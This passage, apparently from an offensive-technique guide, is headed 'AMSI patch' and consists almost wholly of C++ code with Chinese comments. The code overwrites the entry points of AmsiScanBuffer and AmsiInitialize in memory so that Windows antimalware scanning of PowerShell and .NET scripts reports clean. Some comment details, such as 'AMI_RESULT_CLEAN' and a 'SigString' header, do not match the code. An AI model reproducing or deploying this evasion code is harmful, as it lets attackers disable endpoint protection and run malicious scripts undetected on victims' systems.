## 2. AMSI patch

```cpp
// AmsiPatch.cpp - 破坏 AmsiScanBuffer 入口，所有 .NET/PS 脚本扫描直接返回 AMI_RESULT_CLEAN
void PatchAmsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    LPVOID pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    DWORD oldProtect;
    // 标准 patch：return E_INVALIDARG → 上层当 clean 处理
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
    // mov eax, 0x80070057 ; ret

    VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}

// PowerShell/托管场景备用：patch AmsiInitialize 的 SigString 头
void PatchAmsiInit() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    LPVOID pInit = GetProcAddress(amsi, "AmsiInitialize");
    DWORD old;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    VirtualProtect(pInit, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pInit, patch, sizeof(patch));
    VirtualProtect(pInit, sizeof(patch), old, &old);
}
